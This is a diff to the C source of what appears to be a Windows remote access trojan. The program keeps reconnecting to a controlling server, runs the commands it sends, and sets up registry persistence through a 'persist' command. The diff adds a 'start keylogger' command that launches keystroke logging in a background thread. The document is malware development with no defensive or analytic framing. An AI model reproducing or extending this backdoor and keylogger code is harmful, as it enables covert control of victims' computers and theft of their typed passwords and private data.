@@ -8,6 +8,7 @@
 #include <winuser.h>
 #include <wininet.h>
 #include <windowsx.h>
+#include "libs/keylogger.h"
 
 /**
  * The bzero() function erases the data in the n bytes of the memory
@@ -56,7 +57,7 @@ void reconnect() {
     sock = socket(AF_INET, SOCK_STREAM, 0);
 
     while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0) {
-        Sleep(30);
+        Sleep(30000); // 30 sec
     }
 
     Cmd();
@@ -88,7 +89,7 @@ char *slice_str(char str[], int slice_from, int slice_to) {
         if (slice_from > str_len - 1){
             return NULL;
         }
-        
+
         buffer_len = slice_to - slice_from;
         str += slice_from;
     } else {
@@ -166,13 +167,23 @@ void Cmd() {
             closesocket(sock);
             WSACleanup();
             exit(0);
-        } else if (strncmp("cd ", buffer, 3) == 0) {
+        } 
+        // cd - change working dir
+        else if (strncmp("cd ", buffer, 3) == 0) {
             // extract directory name leaving "cd "
             chdir(slice_str(buffer, 3, 100));
             runCmd("cd", &container, &total_response);
-        } else if (strncmp("persist", buffer, 7) == 0) {
+        }
+        // persist - edit registry to auto start
+        else if (strncmp("persist", buffer, 7) == 0) {
             editRegistry();
-        } else {
+        }
+        // start keylogger - start logging key pressed in background thread
+        else if (strncmp("start keylogger", buffer, 15) == 0) {
+            HANDLE thread = CreateThread(NULL, 0, logKey, NULL, 0, NULL);
+        }
+        // default
+        else {
             runCmd(buffer, &container, &total_response);
         }
     }
